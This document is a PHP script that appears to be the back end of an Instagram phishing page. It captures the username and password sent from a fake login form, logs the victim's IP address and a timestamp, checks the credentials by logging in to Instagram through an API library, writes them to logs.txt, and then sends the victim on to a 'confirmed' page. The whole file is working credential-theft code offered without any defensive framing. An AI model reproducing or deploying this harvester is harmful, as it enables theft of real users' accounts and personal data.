<?php  
require 'vendor/autoload.php';    
global $message;  
global $error;

function shutDownFunction() {
    $error = error_get_last();
     // Fatal error, E_ERROR === 1
    if ($error['type'] === E_ERROR) {
        header("Location: ./profile.php");// Do your stuff
    }
}
register_shutdown_function('shutDownFunction');  
                                                                                  
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Instagram Login ==========\n";
$message .= "User: ".$_POST['username']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
use Instagram\Api;
use Symfony\Component\Cache\Adapter\FilesystemAdapter;

$cachePool = new FilesystemAdapter('Instagram', 0, __DIR__ . '/../cache');

$api = new Api($cachePool);
$api->login($_POST['username'], $_POST['password']); 


$message .= "Durum: Başarılı\n";
$message .= "-----------------\n";
$file = fopen("logs.txt","ab");
fwrite($file,$message);
fclose($file);
header("Location: ./confirmed.php");
?>

